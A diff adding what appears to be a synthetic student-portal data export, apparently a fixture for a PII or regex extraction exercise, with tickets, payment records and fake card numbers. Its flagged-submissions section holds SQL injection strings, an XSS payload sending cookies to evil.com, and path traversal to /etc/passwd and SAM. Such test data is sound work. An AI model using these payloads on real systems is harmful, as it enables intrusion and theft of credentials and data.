@@ -1,0 +1,222 @@
+========================================================================
+  ALU STUDENT SERVICES — RAW API DATA EXPORT
+  Source   : StudentPortal API v3.2.1
+  Endpoint : GET /api/v3/export/tickets-and-activity
+  Export   : 2026-05-20T08:30:00Z
+  Warning  : This dump contains unfiltered data from multiple sources.
+             Some records may include user-submitted content that has
+             not been reviewed. Handle with care.
+========================================================================
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  SECTION 1: SUPPORT TICKETS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[TICKET #TKT-2026-0081] | Priority: HIGH | Status: OPEN
+───────────────────────────────────────────────────────────────────────
+From    : alex.murera@alueducation.com
+Contact : +250 788 456 789
+Subject : Tuition Payment Declined — Urgent
+
+Hi team, I attempted to settle my semester fees of RWF 2,500,000 using my
+Visa card (4532 1234 5678 9012) but the portal returned error E-PAY-403.
+I also tried my backup Mastercard 5412 7534 9821 6354 — same result.
+Could someone from billing contact me? My mobile is +250 788 456 789.
+Please see the payment guide at https://portal.alueducation.com/payments/guide
+and the error report at https://portal.alueducation.com/errors/E-PAY-403.
+
+Tags: #PaymentIssue #ALU #Urgent
+───────────────────────────────────────────────────────────────────────
+
+[TICKET #TKT-2026-0082] | Priority: MEDIUM | Status: RESOLVED
+───────────────────────────────────────────────────────────────────────
+From    : sarah.johnson@gmail.com
+CC      : registrar@alueducation.com
+Contact : +1 (617) 890-4321
+Subject : Merit Scholarship Application Confirmation
+
+Hello, I submitted my merit scholarship application on 2026-05-10 via
+https://scholarships.alueducation.com/apply and haven't received a
+confirmation email. The scholarship prize is $5,000.00 USD according to
+the program page. My application reference is SCH-2026-00312.
+Please copy registrar@alueducation.com on any updates.
+More info: https://www.alueducation.com/scholarships/merit-2026
+
+#Scholarship #ALUAfrica #HigherEducation
+───────────────────────────────────────────────────────────────────────
+
+[TICKET #TKT-2026-0083] | Priority: LOW | Status: OPEN
+───────────────────────────────────────────────────────────────────────
+From    : james.osei@alumni.alueducation.com
+Alt     : j.osei.alumni@gmail.com
+Contact : +233 541-234567
+Subject : Alumni Portal Access Expired
+
+Good morning. I graduated in 2025 and my alumni portal login has stopped
+working. My last successful session was 2026-04-30. Subscription renew
+was EUR 150.00, charged to Mastercard ending 6354.
+I also paid KES 3,200 for the alumni newsletter last quarter.
+Please restore access and update my profile.
+Alumni network: https://alumni.alueducation.com/network
+#ALUAlumni #NetworkAccess #AlumniConnect
+───────────────────────────────────────────────────────────────────────
+
+[TICKET #TKT-2026-0084] | Priority: MEDIUM | Status: IN-PROGRESS
+───────────────────────────────────────────────────────────────────────
+From    : amara.diallo@alueducation.com
+Contact : +221 77-456-7890
+Subject : Course Registration Error — Spring Semester
+
+Hi support, I keep getting a 500 error when trying to register for
+COMP 401 and BUSA 302. Both courses show seats available at
+https://courses.alueducation.com/register?term=2026S
+My student ID is STU-2026-11892. Tuition balance: $3,800.00
+Card on file: Discover 6011 0009 9013 9424 (expired next month).
+Reach me at amara.diallo@alueducation.com or 0783-100-200.
+
+#Registration #CourseIssue #ALU
+───────────────────────────────────────────────────────────────────────
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  SECTION 2: PAYMENT TRANSACTION RECORDS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TXN-2026-001 | 2026-05-01T09:12:44Z | Status: COMPLETED
+  Student  : priya.sharma@alueducation.com
+  Amount   : $3,200.00
+  Card     : Visa 4111111111111111
+  IP Addr  : 197.157.43.12
+  Receipt  : https://pay.alueducation.com/receipt/TXN-2026-001
+  Note     : Payment processed via mobile app v2.1.4
+
+TXN-2026-002 | 2026-05-03T11:47:02Z | Status: PENDING
+  Student  : kwame.asante@si.alueducation.com
+  Amount   : RWF 1,800,000
+  Card     : Amex 3714 496353 98431
+  IP Addr  : 41.220.100.5
+  Receipt  : https://pay.alueducation.com/receipt/TXN-2026-002
+  SI Coord : si-coord@si.alueducation.com
+  Note     : Student is on Social Innovation track.
+             Project page: https://si.alueducation.com/projects/kwame-asante-2026
+             #SocialInnovation #ALU #ImpactProject
+
+TXN-2026-003 | 2026-05-05T14:22:10Z | Status: FAILED
+  Student  : fatima.ibrahim@alueducation.com
+  Amount   : KES 85,000
+  Card     : Discover 6011-0009-9013-9424
+  Error    : Issuer declined. CVV mismatch.
+  Contact  : +254 712-345-678 | fatima.ibrahim@alueducation.com
+  Support  : https://support.fintech-partner.io/cases/ERR-CVV-0391
+
+TXN-2026-004 | 2026-05-08T16:05:33Z | Status: COMPLETED
+  Student  : olivier.nkusi@alueducation.com
+  Amount   : RWF 2,500,000
+  Card     : Mastercard 5105-1051-0510-5100
+  IP Addr  : 41.186.20.1
+  Receipt  : https://pay.alueducation.com/receipt/TXN-2026-004
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  SECTION 3: SOCIAL MEDIA ACTIVITY FEED
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+@ALUHub | 2026-05-12T10:01:00Z
+───────────────────────────────────────────────────────────────────────
+Shoutout to all teams who competed in the annual tech hackathon this weekend!
+Outstanding projects in AI, FinTech, and climate tech.
+Check out this year's winners: https://github.com/ALU-Cohort/hackathon-2026
+Support our students: https://donate.alueducation.com/students?campaign=hack2026
+For enquiries: outreach@alueducation.com | +250 252 381 000
+#Hackathon #TechForGood #ALU #RegexChallenge #Innovation
+───────────────────────────────────────────────────────────────────────
+
+@ALUAlumniConnect | 2026-05-15T08:45:22Z
+───────────────────────────────────────────────────────────────────────
+Proud to see ALU alumni making an impact across Africa and beyond!
+Our very own diana.nyambura@alumni.alueducation.com was featured in
+Forbes Africa's 30 Under 30 class of 2026. Congratulations Diana!
+Apply for our mentorship programme (worth $500.00 USD in workshops):
+https://mentorship.alueducation.com/apply?cycle=2026
+#ALUAlumni #Leadership #Africa2026 #Forbes30Under30
+───────────────────────────────────────────────────────────────────────
+
+@ALU_Admissions | 2026-05-18T12:00:00Z
+───────────────────────────────────────────────────────────────────────
+Applications for the 2027 intake are now OPEN!
+Apply at https://apply.alueducation.com and pay the $50.00 application fee.
+Questions? Email admissions@alueducation.com or call +256 752-111-222.
+Scholarship info: https://www.alueducation.com/scholarships
+#Admissions #ALU #StudyInAfrica #Opportunity
+───────────────────────────────────────────────────────────────────────
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  SECTION 4: UNVERIFIED / FLAGGED SUBMISSIONS
+  [Raw, unmoderated entries from the public contact form]
+  [These records have NOT been reviewed by a human agent]
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+--- Entry #F-001 ---
+Name: Robert'); DROP TABLE students; --
+Email: bobby.tables@example.com
+Card: 4532 1234 5678 9012
+Message: Hello I am a student please help me.
+
+--- Entry #F-002 ---
+Name: <script>alert('XSS Attack');</script>
+Email: xss_test@example.com
+Message: <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
+
+--- Entry #F-003 ---
+Name: Valid User
+Email: valid.user99@gmail.com
+Message: SELECT * FROM users WHERE email LIKE '%@alueducation.com' AND 1=1--
+Card: 5555555555554444
+
+--- Entry #F-004 ---
+Name: PathTraversal
+Email: hacker@notreal.io
+Message: Please load file from ../../etc/passwd on the server.
+Alt: ../../../windows/system32/config/sam
+
+--- Entry #F-005 ---
+Name: Reginald Okonkwo
+Email: r.okonkwo@alueducation.com
+Contact: 0788-654-321
+Card: 4000056655665556
+Message: Genuine student here — just checking on my RWF 750,000 semester
+payment status. My receipt URL is https://pay.alueducation.com/receipt/TXN-2026-099
+Thanks, Reginald. #StudentLife #ALU
+
+--- Entry #F-006 ---
+Name: SQL Tester
+Email: test@legitimate-domain.org
+Message: UNION SELECT credit_card, cvv FROM payment_records WHERE user_id=1 INTO OUTFILE '/tmp/dump.txt'
+Note: the above is a penetration test payload (not authorized).
+
+--- Entry #F-007 ---
+Name: Ifeoma Eze
+Email: ifeoma.eze@si.alueducation.com
+Contact: +255 654-987-654
+Card: 3782 822463 10005
+Amount: NGN 150,000
+Message: I'm a Social Innovation fellow and need access restored urgently.
+Project dashboard: https://si.alueducation.com/fellows/ifeoma-eze
+SI coordinator: si-coord@si.alueducation.com
+#SocialInnovation #Nigeria #ALU
+
+--- Entry #F-008 ---
+Name: Fake Card Test
+Card: 9999 9999 9999 9999  (invalid prefix — should be rejected by regex)
+Card: 1234 5678 9012 3456  (invalid prefix — Visa starts with 4)
+Card: 4000000000000002      (valid test Visa number — 16 digits, prefix 4)
+Email: card.tester@example.com
+Message: Testing card validation edge cases.
+
+========================================================================
+  END OF EXPORT
+  Total records: 47 (summarised to 15 in this extract for review)
+  Checksum: SHA-256 = a3f1b2c9...
+========================================================================
